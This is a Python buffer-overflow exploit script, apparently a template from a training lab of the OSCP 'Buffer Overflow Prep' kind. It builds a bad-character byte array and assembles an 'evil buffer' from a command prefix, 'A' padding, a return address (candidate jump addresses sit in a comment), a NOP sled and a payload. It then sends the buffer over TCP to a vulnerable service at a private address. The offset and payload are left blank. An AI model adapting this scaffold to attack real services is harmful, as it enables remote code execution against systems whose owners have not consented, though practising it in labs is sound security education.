#!/usr/bin/env python3
import socket

ip = "192.168.0.87"
port = 1337

# Add bad chars here after first iteration of finding bad chars
# Then re-generate bytearray with the bad chars removed using mona
remove_badchars_from_badchars = "\x00"
badchars = "".join([chr(int(hex(x),16)) for x in range(1,256)])
for char in remove_badchars_from_badchars:
    badchars = badchars.replace(char, "")

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = "" # \x03\x12\x50\x62 \xaf\x11\x50\x62
padding = "\x90" * 0

# Badchars: 
# Payload: 
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")